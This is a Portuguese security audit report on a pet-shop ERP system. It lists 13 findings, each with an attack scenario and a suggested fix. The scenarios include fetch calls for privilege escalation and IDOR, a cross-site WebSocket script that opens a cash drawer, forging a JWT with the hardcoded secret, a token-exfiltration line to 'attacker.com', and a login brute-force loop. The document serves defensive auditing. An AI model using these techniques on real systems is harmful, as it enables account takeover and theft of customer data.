# 🔒 Relatório de Auditoria de Segurança - ERP Pet Shop

**Data da Auditoria:** 20/12/2024  
**Auditor:** Análise de Pentesting Sênior  
**Escopo:** Backend Express, Frontend React, Hardware Service WebSocket  

---

## 📊 Resumo Executivo

| Severidade | Quantidade |
|------------|------------|
| 🔴 Crítica | 4 |
| 🟠 Alta | 4 |
| 🟡 Média | 3 |
| 🟢 Baixa | 2 |

> [!CAUTION]
> **13 vulnerabilidades identificadas**, sendo 8 de alta/crítica severidade. O sistema apresenta falhas graves de controle de acesso, exposição de dados sensíveis e falta de autenticação no serviço de hardware.

---

## 🔴 VULNERABILIDADES CRÍTICAS

---

### 1. Broken Access Control - Rotas de Usuários/Roles sem RBAC

**Vulnerabilidade:** Broken Access Control (Role-Based)  
**Severidade:** 🔴 Crítica  
**Arquivo:** [users.routes.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/routes/users.routes.js), [roles.routes.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/routes/roles.routes.js)

**Cenário de Ataque:**
```javascript
// Um usuário com role "caixa" pode via Burp Suite/Console:
// 1. Listar todos os usuários do sistema
fetch('http://localhost:3001/api/users', {
  headers: { 'Authorization': 'Bearer <TOKEN_DE_CAIXA>' }
})

// 2. Criar um usuário admin
fetch('http://localhost:3001/api/users', {
  method: 'POST',
  headers: { 'Authorization': 'Bearer <TOKEN_DE_CAIXA>', 'Content-Type': 'application/json' },
  body: JSON.stringify({ name: 'Hacker', email: 'hacker@evil.com', password: '123', role: 'admin' })
})

// 3. Resetar senha de qualquer usuário, incluindo admins
fetch('http://localhost:3001/api/users/<ADMIN_ID>/reset-password', {
  method: 'POST',
  headers: { 'Authorization': 'Bearer <TOKEN_DE_CAIXA>', 'Content-Type': 'application/json' },
  body: JSON.stringify({ newPassword: 'owned123' })
})
```

**Problema:** O middleware `authMiddleware` apenas verifica se o token é válido, mas **não valida se o usuário tem permissão** para executar a ação. O `req.user_role` é extraído do JWT mas nunca é verificado.

**Solução Sugerida:**

```javascript
// Criar middleware de autorização em: backend/src/middleware/authorize.middleware.js
export const requireRole = (...allowedRoles) => {
  return (req, res, next) => {
    if (!req.user_role) {
      return res.status(403).json({ error: 'Acesso negado - role não identificado' });
    }
    
    if (!allowedRoles.includes(req.user_role)) {
      return res.status(403).json({ 
        error: 'Acesso negado - permissão insuficiente',
        required: allowedRoles,
        current: req.user_role
      });
    }
    
    next();
  };
};

// Usar nas rotas:
import { requireRole } from '../middleware/authorize.middleware.js';

router.use(authMiddleware);
router.get('/', requireRole('admin', 'gerente'), usersController.list);
router.post('/:id/reset-password', requireRole('admin'), usersController.resetPassword);
```

---

### 2. Broken Access Control - Maioria das Rotas SEM Autenticação

**Vulnerabilidade:** Missing Authentication  
**Severidade:** 🔴 Crítica  
**Arquivo:** [app.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/app.js)

**Cenário de Ataque:**
```javascript
// QUALQUER pessoa na internet pode acessar dados do sistema
// Sem NENHUM token de autenticação:

// Listar todos os clientes com CPF, endereço, telefone
fetch('http://localhost:3001/api/customers')

// Listar todos os produtos com preços de custo
fetch('http://localhost:3001/api/products')

// Ver relatórios financeiros completos
fetch('http://localhost:3001/api/reports/financial-situation')

// Acessar contas a pagar/receber
fetch('http://localhost:3001/api/accounts-payable')

// Ver todas as vendas
fetch('http://localhost:3001/api/sales')
```

**Problema:** No [app.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/app.js), apenas as rotas `/api/auth`, `/api/users` e `/api/roles` usam `authMiddleware`. **Todas as outras 29 rotas estão completamente públicas!**

**Solução Sugerida:**

```javascript
// backend/src/app.js - Substituir o registro de rotas

// Middleware de auth GLOBAL antes das rotas
app.use('/api', (req, res, next) => {
    // Rotas públicas (whitelist)
    const publicRoutes = ['/api/auth/login', '/api/health'];
    if (publicRoutes.some(route => req.path.startsWith(route.replace('/api', '')))) {
        return next();
    }
    // Aplicar autenticação
    return authMiddleware(req, res, next);
});

// Agora todas as rotas abaixo exigem autenticação
app.use('/api/products', productRoutes);
app.use('/api/customers', customerRoutes);
// ... etc
```

---

### 3. WebSocket Hijacking - Hardware Service sem Autenticação

**Vulnerabilidade:** WebSocket Security / Cross-Site WebSocket Hijacking  
**Severidade:** 🔴 Crítica  
**Arquivo:** [hardware-service/src/index.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/hardware-service/src/index.js)

**Cenário de Ataque:**
```html
<!-- Qualquer site malicioso que o operador visite pode: -->
<script>
// Conectar ao hardware service (mesmo de outro domínio!)
const ws = new WebSocket('ws://localhost:3002');

ws.onopen = () => {
  // 1. Abrir a gaveta de dinheiro remotamente
  ws.send(JSON.stringify({ action: 'openDrawer' }));
  
  // 2. Imprimir cupons falsos
  ws.send(JSON.stringify({ 
    action: 'printReceipt', 
    data: { 
      companyName: 'FALSO', 
      saleNumber: '999', 
      total: 0,
      items: [{ name: 'ROUBO', quantity: 1, price: 0, total: 0 }]
    }
  }));
  
  // 3. Listar impressoras do sistema (info gathering)
  ws.send(JSON.stringify({ action: 'listPrinters' }));
};
</script>
```

**Problema:** O `ALLOWED_ORIGINS` só valida se a Origin foi enviada. Browsers não enviam Origin em cenários específicos, e a validação pode ser bypassada:

```javascript
// hardware-service/src/index.js linha 51
if (!originAllowed && origin) {  // <-- Se origin for vazio, PASSA!
```

Além disso, `HARDWARE_API_KEY` está **vazio** por padrão no `.env`, então a validação de API key não acontece.

**Solução Sugerida:**

```javascript
// hardware-service/src/index.js

function validateConnection(request) {
    const origin = request.headers.origin;
    const clientKey = parsedUrl.query.key || request.headers['x-api-key'];

    // CRÍTICO: Rejeitar conexões sem origin em produção
    if (!origin) {
        log('❌ Connection rejected - missing origin header');
        return { valid: false, reason: 'Origin header required' };
    }

    // Validar origin estritamente (nunca wildcard em produção)
    const originAllowed = ALLOWED_ORIGINS.some(allowed => {
        if (allowed === '*') {
            console.warn('⚠️ WARNING: Wildcard origin is insecure!');
            return process.env.NODE_ENV === 'development';
        }
        return origin === allowed.trim();
    });

    if (!originAllowed) {
        log('❌ Connection rejected - invalid origin:', origin);
        return { valid: false, reason: 'Invalid origin' };
    }

    // API Key OBRIGATÓRIA em produção
    if (!API_KEY) {
        console.error('⚠️ CRITICAL: HARDWARE_API_KEY not configured!');
        // Em produção, deveria falhar
    }
    
    if (API_KEY && clientKey !== API_KEY) {
        log('❌ Connection rejected - invalid API key');
        return { valid: false, reason: 'Invalid API key' };
    }

    // Token de sessão - validar com o backend principal
    const sessionToken = parsedUrl.query.sessionToken;
    // TODO: Validar sessionToken contra o backend via HTTP

    return { valid: true };
}
```

**Configuração obrigatória no `.env`:**
```env
HARDWARE_API_KEY=gerar-token-aleatorio-seguro-32chars
ALLOWED_ORIGINS=http://localhost:5173
```

---

### 4. IDOR - Acesso a Dados de Outros Clientes/Pets

**Vulnerabilidade:** Insecure Direct Object Reference (IDOR)  
**Severidade:** 🔴 Crítica  
**Arquivo:** [customers.controller.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/controllers/customers.controller.js)

**Cenário de Ataque:**
```javascript
// Usuário autenticado pode enumerar e acessar TODOS os clientes
// Basta iterar IDs ou usar UUIDs conhecidos

// 1. Ver dados completos de qualquer cliente (CPF, endereço, telefone)
for (let i = 0; i < 1000; i++) {
  fetch(`http://localhost:3001/api/customers/${uuid}`)
    .then(r => r.json())
    .then(data => {
      // Vaza: name, cpf_cnpj, email, phone, address, wallet_balance
      console.log(data);
    });
}

// 2. Modificar dados de qualquer cliente
fetch('http://localhost:3001/api/customers/<OUTRO_CLIENTE_ID>', {
  method: 'PUT',
  body: JSON.stringify({ wallet_balance: 99999.99 })
});

// 3. Deletar pets de outros clientes
fetch('http://localhost:3001/api/customers/pets/<PET_ID>', {
  method: 'DELETE'
});
```

**Problema:** O controller acessa registros diretamente pelo ID sem verificar propriedade ou permissões.

**Solução Sugerida:**

Para operações sensíveis, implementar verificação de propriedade ou permissão:

```javascript
// customers.controller.js - Adicionar verificação

async getById(req, res) {
    try {
        const { id } = req.params;
        
        // Verificar se usuário tem permissão para ver este cliente
        // Opção A: Apenas admins/gerentes podem ver todos
        // Opção B: Vendedores só podem ver clientes que atenderam
        
        const userRole = req.user_role;
        
        if (!['admin', 'gerente'].includes(userRole)) {
            // Verificar se este vendedor tem relação com o cliente
            const hasRelation = await prisma.sales.findFirst({
                where: {
                    customer_id: id,
                    user_id: req.user_id
                }
            });
            
            if (!hasRelation) {
                return res.status(403).json({ 
                    error: 'Acesso negado - você não tem permissão para ver este cliente' 
                });
            }
        }
        
        // ... resto do código
    }
}
```

---

## 🟠 VULNERABILIDADES ALTAS

---

### 5. API Data Leakage - CPF Exposto em Listagens

**Vulnerabilidade:** Sensitive Data Exposure  
**Severidade:** 🟠 Alta  
**Arquivo:** [customers.controller.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/controllers/customers.controller.js#L58-L71)

**Cenário de Ataque:**
```javascript
// GET /api/customers retorna TODOS os campos do cliente
// incluindo dados sensíveis desnecessários para listagens
fetch('http://localhost:3001/api/customers')
// Resposta inclui: cpf_cnpj, email, phone, mobile, address, wallet_balance, loyalty_points
```

**Problema:** A query Prisma não usa `select` para limitar campos, retornando todo o objeto:

```javascript
// Linha 58-69 de customers.controller.js
const [customers, total] = await Promise.all([
    prisma.customers.findMany({
        where,
        skip,
        take: Number(limit),
        orderBy,
        include: {
            _count: { select: { pets: true } }
        }
        // FALTA: select: { id, name, ... } para limitar campos
    }),
```

**Solução Sugerida - Implementar DTOs:**

```javascript
// Criar arquivo: backend/src/utils/dto.js
export const CustomerListDTO = {
    id: true,
    name: true,
    phone: true,
    loyalty_points: true,
    last_purchase_at: true,
    _count: { select: { pets: true } }
    // Excluir: cpf_cnpj, email, address, wallet_balance
};

export const CustomerDetailDTO = {
    ...CustomerListDTO,
    cpf_cnpj: true,  // Apenas no detalhe, se usuário tiver permissão
    email: true,
    address: true,
    pets: true
};

// Usar no controller:
prisma.customers.findMany({
    where,
    select: CustomerListDTO,  // <-- Limitar campos
    skip,
    take
});
```

---

### 6. JWT Secret Fraco e Hardcoded

**Vulnerabilidade:** Weak Cryptographic Key  
**Severidade:** 🟠 Alta  
**Arquivo:** [auth.middleware.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/middleware/auth.middleware.js#L4)

**Cenário de Ataque:**
```javascript
// A secret key está hardcoded no código-fonte:
const SECRET_KEY = process.env.JWT_SECRET || 'erp-pet-shop-secret-key-change-me';

// Se alguém tiver acesso ao código (GitHub público, vazamento, etc),
// pode forjar tokens JWT válidos para qualquer usuário:

const jwt = require('jsonwebtoken');
const forgedToken = jwt.sign(
    { id: 'admin-uuid', email: 'admin@shop.com', role: 'admin' },
    'erp-pet-shop-secret-key-change-me',
    { expiresIn: '8h' }
);
// Agora tem acesso total ao sistema como admin
```

**Solução Sugerida:**

```javascript
// 1. backend/.env (NUNCA commitar)
JWT_SECRET=use-um-gerador-de-32-bytes-aleatorios-aqui

// 2. auth.middleware.js - Falhar se não configurado
const SECRET_KEY = process.env.JWT_SECRET;
if (!SECRET_KEY || SECRET_KEY.includes('change-me')) {
    console.error('❌ FATAL: JWT_SECRET não configurado ou inseguro!');
    process.exit(1);
}

// 3. Gerar secret forte:
// node -e "console.log(require('crypto').randomBytes(32).toString('hex'))"
```

---

### 7. O "Falso Admin" - Role Aceito do Body

**Vulnerabilidade:** Privilege Escalation via Request Body  
**Severidade:** 🟠 Alta  
**Arquivo:** [users.controller.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/controllers/users.controller.js#L117)

**Cenário de Ataque:**
```javascript
// Ao criar usuário, o role vem diretamente do body sem validação
const { name, email, password, cpf, phone, role, role_id, ... } = req.body;

// Atacante manipula a requisição:
fetch('http://localhost:3001/api/users', {
  method: 'POST',
  headers: { 'Authorization': 'Bearer <TOKEN_DE_CAIXA>' },
  body: JSON.stringify({
    name: 'Hacker',
    email: 'hack@evil.com',
    password: '123456',
    role: 'admin'  // <-- ESCALAÇÃO DE PRIVILÉGIO!
  })
});
```

**Solução Sugerida:**

```javascript
// users.controller.js - Validar quem pode definir roles

async create(req, res) {
    const requestorRole = req.user_role;
    const { role, role_id } = req.body;
    
    // Apenas admin pode criar outros admins
    if (role === 'admin' && requestorRole !== 'admin') {
        return res.status(403).json({ 
            error: 'Apenas administradores podem criar outros administradores' 
        });
    }
    
    // Gerentes podem criar caixa/estoque mas não gerente/admin
    if (['admin', 'gerente'].includes(role) && requestorRole === 'gerente') {
        return res.status(403).json({ 
            error: 'Gerentes não podem criar usuários com este nível de acesso' 
        });
    }
    
    // Caixas não devem poder criar usuários
    if (!['admin', 'gerente'].includes(requestorRole)) {
        return res.status(403).json({ error: 'Sem permissão para criar usuários' });
    }
    
    // ... resto do código
}
```

---

### 8. Token Armazenado em localStorage (XSS Vulnerable)

**Vulnerabilidade:** Insecure Token Storage  
**Severidade:** 🟠 Alta  
**Arquivo:** [AuthContext.tsx](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/erp-petshop/src/contexts/AuthContext.tsx#L38-L39)

**Cenário de Ataque:**
```javascript
// Token JWT armazenado em localStorage é vulnerável a XSS
localStorage.setItem('token', token);

// Se houver QUALQUER vulnerabilidade XSS no sistema:
// Atacante pode roubar o token:
const stolenToken = localStorage.getItem('token');
fetch('https://attacker.com/steal?token=' + stolenToken);
```

**Solução Sugerida:**

```javascript
// 1. Backend: Enviar token como HttpOnly cookie
res.cookie('auth_token', token, {
    httpOnly: true,      // Não acessível via JavaScript
    secure: true,        // Apenas HTTPS
    sameSite: 'strict',  // Proteção CSRF
    maxAge: 8 * 60 * 60 * 1000  // 8 horas
});

// 2. Frontend: Remover localStorage para tokens
// O axios/fetch enviará o cookie automaticamente com credentials: 'include'

// 3. api.ts - Configurar credentials
export const api = axios.create({
    baseURL: API_URL,
    withCredentials: true  // Envia cookies automaticamente
});
```

---

## 🟡 VULNERABILIDADES MÉDIAS

---

### 9. CORS Permissivo

**Vulnerabilidade:** Overly Permissive CORS  
**Severidade:** 🟡 Média  
**Arquivo:** [app.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/app.js#L36-L41)

**Problema:**
```javascript
app.use(cors({
    origin: [process.env.FRONTEND_URL || 'http://localhost:5173', 'http://localhost:5174'],
    // ...
    credentials: true,  // Permite cookies cross-origin
}));
```

Se `FRONTEND_URL` não estiver configurado e o sistema for deployado, qualquer origem localhost terá acesso.

**Solução Sugerida:**
```javascript
const allowedOrigins = process.env.ALLOWED_ORIGINS?.split(',') || [];

if (process.env.NODE_ENV === 'production' && allowedOrigins.length === 0) {
    console.error('❌ ALLOWED_ORIGINS não configurado em produção!');
    process.exit(1);
}

app.use(cors({
    origin: (origin, callback) => {
        // Permitir requisições sem origin (mobile apps, Postman)
        if (!origin) return callback(null, true);
        
        if (allowedOrigins.includes(origin)) {
            callback(null, true);
        } else {
            callback(new Error('Bloqueado por CORS'));
        }
    },
    credentials: true
}));
```

---

### 10. Exposição de Preço de Custo

**Vulnerabilidade:** Business Data Leakage  
**Severidade:** 🟡 Média  
**Arquivo:** [product.controller.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/controllers/product.controller.js#L5-L37)

**Problema:**
```javascript
// GET /api/products retorna cost_price para TODOS os usuários
const result = await pool.query(`
    SELECT 
        p.cost_price,  // <-- Dados confidenciais expostos
        ...
`);
```

**Solução Sugerida:**
```javascript
// Retornar cost_price apenas para admin/gerente
const products = result.rows.map(row => {
    const product = {
        id: row.id,
        name: row.name,
        sale_price: parseFloat(row.sale_price),
        stock_quantity: parseInt(row.stock_quantity),
        // ...
    };
    
    // Apenas roles autorizados veem custo
    if (['admin', 'gerente'].includes(req.user_role)) {
        product.cost_price = parseFloat(row.cost_price);
    }
    
    return product;
});
```

---

### 11. Falta de Rate Limiting no Login

**Vulnerabilidade:** Brute Force Attack Vector  
**Severidade:** 🟡 Média  
**Arquivo:** [auth.controller.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/controllers/auth.controller.js)

**Cenário de Ataque:**
```javascript
// Atacante pode fazer milhares de tentativas de login
for (let i = 0; i < 100000; i++) {
    fetch('http://localhost:3001/api/auth/login', {
        method: 'POST',
        body: JSON.stringify({ email: 'admin@shop.com', password: passwords[i] })
    });
}
```

**Solução Sugerida:**
```javascript
// Instalar: npm install express-rate-limit

import rateLimit from 'express-rate-limit';

const loginLimiter = rateLimit({
    windowMs: 15 * 60 * 1000, // 15 minutos
    max: 5, // 5 tentativas
    message: { error: 'Muitas tentativas de login. Tente novamente em 15 minutos.' },
    standardHeaders: true,
    legacyHeaders: false,
});

// Aplicar no app.js
app.use('/api/auth/login', loginLimiter);
```

---

## 🟢 VULNERABILIDADES BAIXAS

---

### 12. Logs de Erro Expõem Stack Traces

**Vulnerabilidade:** Information Disclosure  
**Severidade:** 🟢 Baixa  
**Arquivo:** Múltiplos controllers

**Problema:** `console.error` pode vazar informações sensíveis em produção.

**Solução:**
```javascript
// Usar logger estruturado com níveis
import winston from 'winston';

const logger = winston.createLogger({
    level: process.env.NODE_ENV === 'production' ? 'error' : 'debug',
    format: winston.format.json(),
    transports: [new winston.transports.Console()]
});

// Substituir console.error por:
logger.error('Erro ao criar venda', { error: error.message });
// Não logar error.stack em produção
```

---

### 13. Ausência de Validação de Input (XSS Potencial)

**Vulnerabilidade:** Input Validation / XSS  
**Severidade:** 🟢 Baixa  
**Arquivo:** Múltiplos controllers

**Problema:** Dados de entrada não são sanitizados antes de salvar no banco.

**Solução:**
```javascript
// Instalar: npm install xss

import xss from 'xss';

// Sanitizar inputs de texto livre
const sanitizedName = xss(req.body.name);
const sanitizedDescription = xss(req.body.description);
```

---

## 📋 Checklist de Correções Prioritárias

### Imediato (Antes de ir para produção):

- [ ] Aplicar `authMiddleware` globalmente em todas as rotas `/api/*`
- [ ] Implementar middleware de autorização baseado em roles
- [ ] Configurar `HARDWARE_API_KEY` forte e validar obrigatoriamente
- [ ] Gerar `JWT_SECRET` forte (32+ bytes aleatórios)
- [ ] Implementar rate limiting no endpoint de login

### Curto prazo (1-2 semanas):

- [ ] Migrar tokens para HttpOnly cookies
- [ ] Implementar DTOs para limitar campos retornados
- [ ] Adicionar verificação de propriedade (IDOR) em endpoints sensíveis
- [ ] Restringir quem pode definir/alterar roles de usuários
- [ ] Configurar CORS restritivo para produção

### Médio prazo:

- [ ] Implementar sistema de permissões granulares
- [ ] Adicionar auditoria de ações sensíveis
- [ ] Implementar sanitização de inputs
- [ ] Configurar logging estruturado

---

## 🔧 Arquivos a Modificar (Prioridade)

1. [backend/src/app.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/app.js) - Auth global
2. [backend/src/middleware/auth.middleware.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/middleware/auth.middleware.js) - RBAC
3. [hardware-service/src/index.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/hardware-service/src/index.js) - WebSocket auth
4. [backend/src/controllers/users.controller.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/controllers/users.controller.js) - Privilege escalation
5. [backend/src/controllers/customers.controller.js](file:///c:/Users/iruka/OneDrive/Desenvolvimento/ERP%20Pet%20Shop/backend/src/controllers/customers.controller.js) - IDOR/DTO
